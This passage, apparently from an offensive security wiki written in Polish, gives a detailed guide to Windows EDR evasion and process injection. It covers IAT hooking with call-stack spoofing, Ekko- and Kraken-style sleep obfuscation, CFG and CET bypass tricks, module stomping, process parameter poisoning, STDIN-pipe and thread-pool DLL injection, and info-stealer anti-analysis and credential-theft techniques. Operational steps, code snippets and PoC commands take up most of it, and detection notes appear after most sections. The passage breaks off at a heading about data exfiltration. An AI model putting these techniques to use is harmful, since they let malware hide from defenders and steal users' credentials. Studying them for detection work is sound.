  - Maskowanie/odmaskowanie pamięci przed wywołaniem i po nim (np. szyfrowanie regionów beacona, zmiana RWX→RX, zmiana nazw/uprawnień stron), a następnie przywrócenie stanu.
  - Call-stack spoofing: utworzenie pozornie nieszkodliwego stosu i przejście do docelowego API, tak aby analiza call stacka wskazywała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Aby zapewnić zgodność, udostępnij interfejs, za pomocą którego skrypt Aggressor (lub jego odpowiednik) może rejestrować API do hookowania dla Beacon, BOF-ów i bibliotek DLL używanych po eksploatacji.

Dlaczego tutaj warto użyć IAT hooking
- Działa z każdym kodem korzystającym z hookowanego importu, bez modyfikowania kodu narzędzia ani polegania na Beaconie, który miałby pośredniczyć w wybranych wywołaniach API.
- Obejmuje biblioteki DLL używane po eksploatacji: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować do ich wywołań API te same techniki maskowania i ukrywania stosu.
- Przywraca niezawodne działanie poleceń post-ex uruchamiających procesy w obliczu detekcji opartych na call stacku, przez opakowanie CreateProcessA/W.

Minimalny przykład IAT hooka (pseudokod x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Zastosuj patch po relokacjach/ASLR, a przed pierwszym użyciem importu. Reflective loaders, takie jak TitanLdr/AceLdr, demonstrują hookowanie podczas DllMain załadowanego modułu.
- Wrappery powinny być małe i bezpieczne dla PIC; prawdziwe API ustal na podstawie oryginalnej wartości IAT przechwyconej przed patchowaniem albo za pomocą LdrGetProcedureAddress.
- Przy PIC stosuj przejścia RW → RX i unikaj pozostawiania stron z prawami do zapisu i wykonywania.

### Stub do spoofingu call stacka
- Stub-y PIC w stylu Draugr tworzą fałszywy łańcuch wywołań (adresy powrotu w nieszkodliwych modułach), a następnie przekazują sterowanie do prawdziwego API.
- Udaremnia to wykrywanie oparte na oczekiwaniu kanonicznych stosów wywołań z Beacon/BOFs do wrażliwych API.
- Połącz tę metodę z technikami stack cutting/stack stitching, aby przed prologiem API znaleźć się w oczekiwanych ramkach.

### Integracja operacyjna
- Umieść reflective loader na początku DLL-i post-ex, aby PIC i hooki inicjalizowały się automatycznie podczas ładowania DLL-a.
- Użyj skryptu Aggressor do rejestrowania docelowych API, by Beacon i BOFs korzystały z tej samej ścieżki omijania zabezpieczeń bez zmian w kodzie.

### Kwestie wykrywania i DFIR
- Integralność IAT: wpisy wskazujące na adresy spoza obrazu (heap/anon); okresowa weryfikacja wskaźników importu.
- Anomalie stosu: adresy powrotu nienależące do załadowanych obrazów; nagłe przejścia do nieobrazowego PIC; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy w IAT wykonywane w procesie; wczesna aktywność DllMain modyfikująca thunki importów; nieoczekiwane obszary RX tworzone podczas ładowania.
- Omijanie image-load: jeśli hookujesz LoadLibrary*, monitoruj podejrzane ładowania zestawów automation/clr skorelowane ze zdarzeniami maskowania pamięci.

### Powiązane elementy i przykłady
- Reflective loaders wykonujące patchowanie IAT podczas ładowania (np. TitanLdr, AceLdr)
- Hooki maskowania pamięci (np. simplehook) i PIC do stack cutting (stackcutting)
- Stub-y PIC do spoofingu call stacka (np. Draugr)


## Hookowanie IAT podczas importu + obfuskacja uśpienia (Crystal Palace/PICO)

### Hooki IAT podczas importu za pośrednictwem rezydentnego PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik loadera `GetProcAddress` własnym resolverem, który najpierw sprawdza hooki:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Zbuduj **rezydentny PICO** (trwały obiekt PIC), który przetrwa zwolnienie się tymczasowego PIC loadera.
- Udostępnij funkcję `setup_hooks()`, która nadpisuje resolver importów loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj importy porządkowe i używaj wyszukiwania hooków na podstawie hasha, np. `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie przekaż wywołanie do prawdziwego `GetProcAddress`.
- Rejestruj cele hooków podczas linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje prawidłowy, ponieważ znajduje się w rezydentnym PICO.

Umożliwia to **przekierowanie IAT podczas importu** bez patchowania sekcji kodu załadowanej DLL po jej załadowaniu.

### Wymuszanie importów możliwych do hookowania, gdy cel używa PEB-walking

Hooki podczas importu zadziałają tylko wtedy, gdy dana funkcja rzeczywiście znajduje się w IAT celu. Jeśli moduł rozwiązuje API za pomocą PEB-walk + hash (bez wpisu importu), wymuś prawdziwy import, aby ścieżka `ProcessImports()` loadera go wykryła:

- Zastąp rozwiązywanie eksportów na podstawie hasha (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, umożliwiając przechwycenie importu podczas jego rozwiązywania przez reflective loader.

### Obfuskacja uśpienia/bezczynności w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste prymitywy oczekiwania/IPC** używane przez implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długiego oczekiwania opakuj wywołanie w łańcuch obfuskacji w stylu Ekko, który szyfruje obraz w pamięci na czas bezczynności:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z odpowiednio przygotowanymi ramkami `CONTEXT`.
- Typowy łańcuch (x64): ustaw obraz na `PAGE_READWRITE` → zaszyfruj RC4 cały zamapowany obraz za pomocą `advapi32!SystemFunction032` → wykonaj blokujące oczekiwanie → odszyfruj RC4 → **przywróć uprawnienia poszczególnych sekcji**, przechodząc po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza szablon `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać każdy etap.

Szczegół operacyjny: zwracaj „success” w przypadku długiego oczekiwania (np. `WAIT_OBJECT_0`), aby wywołujący kontynuował działanie, gdy obraz jest zamaskowany. Ten wzorzec ukrywa moduł przed skanerami podczas okresów bezczynności i pozwala uniknąć charakterystycznego wzorca „patchowania `Sleep()`”.

Pomysły na wykrywanie (na podstawie telemetrii)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buforach o rozmiarze obrazu.
- Wywołanie `VirtualProtect` na dużym zakresie, po którym następuje niestandardowe przywrócenie uprawnień poszczególnych sekcji.

### Rejestracja CFG w czasie działania dla gadżetów obfuskacji uśpienia

W celach z włączonym CFG pierwszy pośredni skok do gadżetu ze środka funkcji, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle zakończy się awarią procesu z `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadżet nie znajduje się w metadanych CFG modułu. Aby łańcuchy w stylu Ekko/Kraken działały w zabezpieczonych procesach:<sup>[[30]](#references)</sup>

- Zarejestruj każdy pośredni cel używany przez łańcuch za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i wpisów `CFG_CALL_TARGET_VALID`.
- W przypadku adresów wewnątrz załadowanych obrazów (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **bazy obrazu** i obejmować **cały rozmiar obrazu**.
- W przypadku ręcznie mapowanych/obszarów PIC/stomped użyj **bazy alokacji** i rozmiaru alokacji.
- Oznacz nie tylko gadżet dyspozytorski, lecz także eksporty osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wywołania systemowe oczekiwania/zdarzeń) oraz wszystkie wykonywalne sekcje kontrolowane przez atakującego, które staną się pośrednimi celami.

Dzięki temu łańcuchy uśpienia w stylu ROP/JOP zmieniają się z „działa tylko w procesach bez CFG” w ponownie używalny prymityw dla `explorer.exe`, przeglądarek, `svchost.exe` i innych procesów skompilowanych z `/guard:cf`.

### Bezpieczny dla CET spoofing stosu uśpionych wątków

Pełna podmiana `CONTEXT` jest łatwa do wykrycia i może zawieść w systemach z CET Shadow Stack, ponieważ spoofowany `Rip` musi nadal być zgodny ze sprzętowym shadow stackiem. Bezpieczniejszy wzorzec maskowania uśpienia wygląda następująco:<sup>[[30]](#references)</sup>

- Wybierz inny wątek w tym samym procesie i odczytaj granice jego stosu `NT_TIB` / TEB (`StackBase`, `StackLimit`) za pomocą `NtQueryInformationThread`.
- Zrób kopię zapasową prawdziwego TEB/TIB bieżącego wątku.
- Przechwyć prawdziwy kontekst uśpionego wątku za pomocą `GetThreadContext`.
- Skopiuj do spoofowanego kontekstu **wyłącznie** prawdziwy `Rip`, pozostawiając spoofowane `Rsp` i stan stosu bez zmian.
- Podczas uśpienia skopiuj `NT_TIB` spoofowanego wątku do bieżącego TEB, aby unwinding stosu odbywał się w prawidłowym zakresie stosu.
- Po zakończeniu oczekiwania przywróć oryginalny TIB i kontekst wątku.

Pozwala to zachować wskaźnik instrukcji zgodny z CET, jednocześnie wprowadzając w błąd mechanizmy EDR do analizy stosu, które ufają metadanym stosu w TEB przy weryfikowaniu unwindów.

### Alternatywa oparta na APC: Kraken Mask

Jeśli dispatch z użyciem kolejki timerów jest zbyt charakterystyczny, tę samą sekwencję uśpienia, szyfrowania, spoofingu i przywracania można wykonać z użyciem zawieszonego wątku pomocniczego i kolejkowanych APC:<sup>[[27]](#references)</sup>

- Utwórz wątek pomocniczy, używając `NtTestAlert` jako punktu wejścia.
- Dodaj przygotowane ramki `CONTEXT`/APC za pomocą `NtQueueApcThread` i opróżnij je przez `NtAlertResumeThread`.
- Przechowuj stan łańcucha na heapie, a nie na stosie wątku pomocniczego, aby uniknąć wyczerpania domyślnego stosu wątku o rozmiarze 64 KB.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować zdarzenie startowe i zablokować działanie.
- Zawieś główny wątek przed przywróceniem TIB/kontekstu (`NtSuspendThread` → przywrócenie → `NtResumeThread`), aby ograniczyć okno wyścigu, w którym skaner mógłby wykryć częściowo przywrócony stos.

Zastępuje to charakterystyczną sekwencję `CreateTimerQueueTimer` + `NtContinue` sekwencją wątku pomocniczego/APC, zachowując te same cele maskowania RC4 i spoofingu stosu.

Dodatkowe pomysły na wykrywanie
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` tuż przed uśpieniem, oczekiwaniem lub dispatch APC.
- `GetThreadContext`/`SetThreadContext` opakowane wokół `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do granic stosu TEB/TIB bieżącego wątku.
- Łańcuchy `NtQueueApcThread`/`NtAlertResumeThread`, które pośrednio wywołują `SystemFunction032`, `VirtualProtect` lub funkcje pomocnicze przywracające uprawnienia sekcji.
- Powtarzające się użycie krótkich sygnatur gadżetów, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako punktów przestawienia dispatch w podpisanych modułach.


## Precyzyjne module stomping

Module stomping wykonuje payloady z **sekcji `.text` DLL-a już zamapowanego w procesie docelowym**, zamiast przydzielać oczywistą prywatną pamięć wykonywalną lub ładować nowy, poświęcony DLL. Celem nadpisania powinien być **załadowany obraz wspierany plikiem na dysku**, którego obszar kodu pomieści payload bez uszkadzania ścieżek kodu nadal potrzebnych procesowi.<sup>[[1]](#references)[[2]](#references)</sup>

### Niezawodny wybór celu

Naiwny stomping popularnych modułów, takich jak `uxtheme.dll` lub `comctl32.dll`, jest zawodny: DLL może nie być załadowany w zdalnym procesie, a zbyt mały obszar kodu spowoduje awarię procesu. Bardziej niezawodny przebieg pracy:

1. Wylicz moduły procesu docelowego i pozostaw **listę dozwolonych nazw** zawierającą tylko już załadowane DLL-e.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj kandydackie DLL-e na dysku i porównaj rozmiar sekcji PE **`.text` `Misc_VirtualSize`** z rozmiarem payloadu. Ma to większe znaczenie niż rozmiar pliku, ponieważ odzwierciedla rozmiar sekcji wykonywalnej **po zamapowaniu w pamięci**.
4. Przeanalizuj **Export Address Table (EAT)** i wybierz RVA eksportowanej funkcji jako początkowy offset stompingu.
5. Oblicz **zasięg oddziaływania**: jeśli payload przekracza granicę wybranej funkcji, nadpisze sąsiadujące eksporty znajdujące się za nią w pamięci.

Typowe narzędzia pomocnicze do rozpoznania i wyboru celów spotykane w praktyce:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Uwagi operacyjne
- Preferuj DLL-e **już załadowane** do zdalnego procesu, aby uniknąć telemetrii `LoadLibrary`/nieoczekiwanych załadowań obrazów.
- Preferuj eksporty rzadko wykonywane przez aplikację docelową, w przeciwnym razie normalne ścieżki kodu mogą trafić na nadpisane bajty przed utworzeniem wątku lub po nim.
- Duże implanty często wymagają zmiany sposobu osadzania shellcode z literału łańcucha znaków na **inicjalizator tablicy bajtów/ujęty w nawiasy klamrowe**, aby cały bufor został prawidłowo uwzględniony w kodzie injectora.

Pomysły na wykrywanie
- Zdalne zapisy do **stron wykonywalnych opartych na obrazie** (`MEM_IMAGE`, `PAGE_EXECUTE*`) zamiast częściej spotykanych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie są już zgodne z plikiem źródłowym na dysku.
- Zdalne wątki lub przestawienia kontekstu, które rozpoczynają wykonywanie wewnątrz eksportu legalnej biblioteki DLL, którego początkowe bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` dotyczące stron `.text` bibliotek DLL, po których następuje utworzenie wątku.

## Zatruwanie parametrów procesu (P3)

Process Parameter Poisoning (P3) to technika **process-injection / EDR-evasion**, która omija klasyczną ścieżkę zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już uruchomionego procesu docelowego, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nośniki podatne na zatrucie, kopiowane przez `CreateProcessW`

Przydatne nośniki to:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograniczenia praktyczne nośników:

- `lpCommandLine` musi wskazywać na **zapisywalną pamięć** dla `CreateProcessW` i jest ograniczone do **32 767 znaków Unicode**, łącznie z terminatorem null.
- `lpEnvironment` musi być blokiem środowiska Unicode składającym się z kolejnych łańcuchów `NAZWA=WARTOŚĆ\0`, zakończonym dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, dlatego mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilny, udokumentowany kontrakt.

Dzięki temu zwykłe tworzenie procesu staje się **mechanizmem transferu payloadu**. Operator tworzy proces potomny z kontrolowanymi przez atakującego danymi startowymi, a Windows wykonuje kopiowanie między procesami.

### Przepływ wyszukiwania zdalnego bez zdalnych API zapisu

Po utworzeniu procesu potomnego odszukaj skopiowany bufor za pomocą prymitywów **tylko do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Podążaj za `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalny przepływ:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Wykonywanie skopiowanego bufora parametrów

Skopiowany obszar parametrów ma zwykle uprawnienia `RW`, a nie wykonywalne. Typowy łańcuch P3 wygląda następująco:

1. Utwórz proces normalnie (nie w stanie wstrzymania)
2. Nadaj wybranej stronie parametrów uprawnienia wykonywania za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponownie użyj uchwytu głównego wątku zwróconego już w `PROCESS_INFORMATION`
4. Przekieruj wykonanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisz `RIP`)

W przeciwieństwie do klasycznych procedur przejmowania wątku nie wymaga to użycia `SuspendThread` / `ResumeThread`; kontekst można zmienić bezpośrednio za pomocą zwróconego uchwytu głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często również `SuspendThread` / `ResumeThread`

### Ograniczenie związane z bajtami null i staged shellcode

Wszystkie trzy nośniki zawierają **dane tekstowe lub podobne do tekstu**, więc surowy payload zawierający `0x00` zostaje obcięty podczas przesyłania. Praktycznym obejściem jest **pierwszy etap bez bajtów null**, który odtwarza stałe w czasie działania, a następnie ładuje dowolny drugi etap.

Prosty wzorzec polega na syntezie stałych z użyciem XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Pozwala to pierwszemu etapowi tworzyć ciągi znaków na stosie, argumenty API, ścieżki DLL lub loader shellcode’u drugiego etapu bez umieszczania bajtów null w przesyłanym parametrze.

### Wywołania API oparte na stosie z pierwszego etapu

Gdy pierwszy etap musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić ciąg znaków/bufor na stosie procesu docelowego
- zarezerwować **32-bajtową przestrzeń shadow space x64**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe lub wskaźniki względem `RSP`
- zachować **16-bajtowe wyrównanie** `RSP` przed wywołaniem

Drugi etap można następnie skopiować ze stosu do alokacji `PAGE_READWRITE`, zmienić jej uprawnienia na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect` i wykonać skok do niej, unikając bezpośredniej alokacji RWX.

### Pomysły na wykrywanie

Autorzy wskazują następujące obszary warte analizy:

- `VirtualProtectEx` / `NtProtectVirtualMemory` zmieniające **strony parametrów procesu na wykonywalne**
- zmiana uprawnień, po której następuje `SetThreadContext` / `NtSetContextThread`
- zdalny odczyt `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie wartości lub wartości o wysokiej entropii w `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **sztuczka transferu między procesami**, a nie samodzielny, pełny mechanizm wykonywania: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie i metody przekierowania wykonania.
- Autorzy rozważali `RtlCreateProcessReflection` / Dirty Vanity, ale odrzucili to rozwiązanie, ponieważ wewnętrznie korzysta z podejrzanych prymitywów, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Wstrzykiwanie przez potok konsoli STDIN

Interaktywny proces potomny konsoli może również służyć jako **prymityw transferu payloadu**. Injector przekierowuje standardowe wejście procesu potomnego do potoku i wysyła znacznik, po którym następuje shellcode. Gdy program konsolowy odczyta dane do własnej prywatnej pamięci, injector znajduje ten bufor, nadaje mu uprawnienia do wykonywania i przekierowuje do niego wątek procesu potomnego. Pozwala to uniknąć `VirtualAllocEx` i `WriteProcessMemory`, ale nadal jest to process injection, a nie ogólny sposób na ominięcie EDR.<sup>[[41]](#references)</sup>

Mimo opisu mówiącego o „named pipe” implementacja referencyjna wywołuje `CreatePipe`, które tworzy **potok anonimowy**. Windows wewnętrznie implementuje potoki anonimowe przy użyciu obiektów potoków o unikatowych nazwach, ale PoC ani nie wybiera ścieżki `\\.\pipe\<name>`, ani nie wywołuje `CreateNamedPipe`. Tworzy uchwyty dziedziczone z domyślnym deskryptorem zabezpieczeń, umieszcza uchwyt do odczytu w `STARTUPINFO.hStdInput`, ustawia `STARTF_USESTDHANDLES` i uruchamia nowy proces potomny z włączonym dziedziczeniem uchwytów. Dlatego ten PoC uruchamia podany plik wykonywalny konsoli; nie podłącza swojego potoku do istniejącego procesu.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Przebieg referencyjny

Implementacja wykorzystuje następujący łańcuch:<sup>[[41]](#references)</sup>

1. Utwórz pary anonimowych potoków dla `STDIN` i `STDOUT` procesu potomnego. Wyłącz dziedziczenie dla dwóch uchwytów po stronie procesu nadrzędnego i zamknij w nim kopie uchwytów po stronie procesu potomnego po utworzeniu procesu.
2. Uruchom interaktywny plik wykonywalny, taki jak `netsh.exe` lub `nslookup.exe`, z flagą `CREATE_NEW_CONSOLE`. Proces potomny dziedziczy przekierowane uchwyty standardowe.
3. Wyślij całą tablicę binarną `rawData` przez uchwyt `STDIN` po stronie procesu nadrzędnego za pomocą `WriteFile`. Program konsolowy odczytuje bajty i pozostawia ich kopię w jednym ze swoich prywatnych, zatwierdzonych obszarów pamięci.
4. Przejdź po przestrzeni adresowej procesu potomnego za pomocą `VirtualQueryEx`, odczytaj kandydackie regiony `MEM_PRIVATE` za pomocą `ReadProcessMemory` i wyszukaj znacznik na początku `rawData`.
5. Zmień uprawnienia znalezionego bufora na `PAGE_EXECUTE_READWRITE` za pomocą `VirtualProtectEx`.
6. Zidentyfikuj główny wątek, zawieś go, ustaw `RIP` na `found_address + 0x19` za pomocą `NtSetContextThread` i wznów jego działanie.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostarczona implementacja jest przeznaczona dla x64: modyfikuje `CONTEXT.Rip`, a osadzony payload to shellcode x64. `rawData` zaczyna się od 25-bajtowego znacznika, więc wykonywalne bajty zaczynają się pod szesnastkowym offsetem `0x19`. Przy wymianie payloadu zachowaj ten układ albo zaktualizuj jednocześnie znacznik, wektor wyszukiwania, rozmiar tablicy i offset wykonania. Komentarze w kodzie źródłowym wymieniają też `0x0A`, `0x0D` i `0x1A` jako niedozwolone znaki. Ten workflow nie zmienia tokenu ani uprawnień procesu potomnego.<sup>[[41]](#references)</sup>

Wzorce kompilacji małych natywnych helperów i payloadów opisano w [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Iniekcja DLL przez callback puli wątków bez shellcode (DLLParty)

DLLParty adaptuje iniekcję puli wątków w stylu PoolParty tak, aby istniejący worker procesu docelowego wywołał `LoadLibraryA` zamiast wykonywać wstrzyknięty stub callbacku. Prymitywem dyspozycji jest `TP_DIRECT` umieszczony w kolejce portu ukończenia I/O puli docelowej. Nie omija to uprawnień procesu: PoC wywołuje `OpenProcess(PROCESS_ALL_ACCESS)` i wymaga możliwości odczytu i zapisu pamięci procesu docelowego oraz duplikowania uchwytów do worker factory i portu ukończenia.<sup>[[46]](#references)[[47]](#references)</sup>

W Windows x64 worker przekazuje wskaźnik do instancji `TP_CALLBACK_INSTANCE` znajdującej się na stosie w `RCX`, czyli jako pierwszy argument callbacku. `LoadLibraryA` interpretuje ten sam wskaźnik jako `LPCSTR`. Na testowanej ścieżce `TppWorkerThread` tworzy wskaźnik pod `RSP+0x178`, a pierwszy zwykły zapis do tego obiektu wykonuje pod `RSP+0x1d0`. Ścieżka DLL zakończona znakiem null, mieszcząca się w tym prefiksie o długości 0x58 bajtów, może więc znaleźć się na początku instancji i nie zostanie nadpisana przed dyspozycją. To obserwacja zależna od konkretnej kompilacji, a nie udokumentowana gwarancja ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Referencyjny workflow wygląda następująco:<sup>[[46]](#references)[[47]](#references)</sup>

1. Wylicz uchwyty procesu docelowego za pomocą `NtQuerySystemInformation(SystemHandleInformation)` i zidentyfikuj `TpWorkerFactory`, odpytując typy obiektów. Zduplikuj uchwyt worker factory i odpytaj `WorkerFactoryBasicInformation`; `StartParameter` wskazuje zdalny `TP_POOL`. Pomiń fabryki, dla których `TotalWorkerCount == 0`.
2. Odczytaj `TP_POOL.CompletionPort` i przejdź po prywatnej liście workerów puli. W testowanej kompilacji Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) głowa listy znajduje się pod `pool+0x60`; każde łącze pod `worker+0x10`, więc slot instancji callbacku pod `worker+0x38` jest równy `link+0x28`. PoC sprawdza wyrównanie wskaźników, wzajemność łączy, przynależność do puli, niezerowe identyfikatory wątków, powtarzające się węzły i stabilność głowy listy.
3. Zapisz ścieżkę DLL w **każdym** odzyskanym slocie workera, ponieważ umieszczone w kolejce powiadomienie o ukończeniu może obsłużyć dowolny worker. Umieść `TP_DIRECT` z `Callback = LoadLibraryA` w zapisywalnej pamięci procesu docelowego. PoC używa `last_slot-0x500` na stosie workera zamiast `VirtualAllocEx`; ten offset jest eksperymentalny i nie może kolidować z aktywnymi danymi stosu.
4. Zduplikuj uchwyt portu ukończenia procesu docelowego i wywołaj `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Zdalny adres `TP_DIRECT` jest kluczem ukończenia. Istniejący worker wywołuje następnie `LoadLibraryA` ze swoim nadpisanym wskaźnikiem instancji callbacku, ładując DLL dostępną już dla procesu docelowego.

PoC przyjmuje PID procesu docelowego (`DLLParty.exe <target_pid>`) i używa zakodowanej na stałe ścieżki DLL w `DLLParty.cpp`; przed kompilacją pliku wykonywalnego x64 ustaw ścieżkę dostępną dla procesu docelowego. Używa też adresu `LoadLibraryA` z własnego procesu jako zdalnego callbacku, zakładając, że ten adres jest poprawny w procesie docelowym. Kod nie sprawdza, czy długość ścieżki mieści się w prefiksie o długości 0x58 bajtów ani czy przechodzenie po workerach znalazło slot przed pobraniem ostatniego elementu. Ponownie zweryfikuj prywatne offsety, układ stosu i zapisywalną przestrzeń dla docelowej kompilacji. Pominięcie `CreateRemoteThreadEx`, shellcode i `VirtualAllocEx` nie eliminuje zapisów między procesami ani telemetrii ładowania DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Techniki SantaStealer do fileless evasion i kradzieży danych uwierzytelniających

SantaStealer (znany też jako BluelineStealer) pokazuje, jak współczesne info-stealery łączą AV bypass, anti-analysis i dostęp do danych uwierzytelniających w jednym workflow.<sup>[[24]](#references)</sup>

### Weryfikacja układu klawiatury i opóźnianie w sandboxie

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli wykryje układ cyryliczny, próbka tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów. Dzięki temu nie uruchamia się w wykluczonych lokalizacjach, a jednocześnie pozostawia artefakt przydatny do wyszukiwania.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Warstwowa logika `check_antivm`

- Wariant A przechodzi przez listę procesów, oblicza dla każdej nazwy niestandardową kroczącą sumę kontrolną i porównuje ją z osadzonymi listami blokowanych debuggerów/sandboxów; powtarza obliczanie sumy dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, niedawny czas od uruchomienia), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, i wykonuje pomiary czasu wokół uśpienia, by wykryć wykonywanie krok po kroku. Każde wykrycie przerywa działanie przed uruchomieniem modułów.

### Fileless helper + podwójne reflective loading z ChaCha20

- Główna DLL/EXE zawiera helper Chromium do przechwytywania danych uwierzytelniających, który jest zapisywany na dysku albo ręcznie mapowany w pamięci; tryb fileless sam rozwiązuje importy/relokacje, więc żadne artefakty helpera nie są zapisywane.
- Ten helper przechowuje DLL drugiego etapu, dwukrotnie zaszyfrowaną za pomocą ChaCha20 (dwa klucze 32-bajtowe + nonce'y 12-bajtowe). Po obu etapach odszyfrowywania blob jest ładowany reflective loading (bez `LoadLibrary`), a następnie wywoływane są eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z projektu [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Procedury ChromElevator wykorzystują process hollowing z reflective loading i direct-syscall, aby wstrzyknąć kod do działającej przeglądarki Chromium, przejąć klucze AppBound Encryption i odszyfrować hasła/pliki cookie/dane kart kredytowych bezpośrednio z baz SQLite, mimo zabezpieczeń ABE.

### Modularne zbieranie danych w pamięci i eksfiltracja HTTP w porcjach

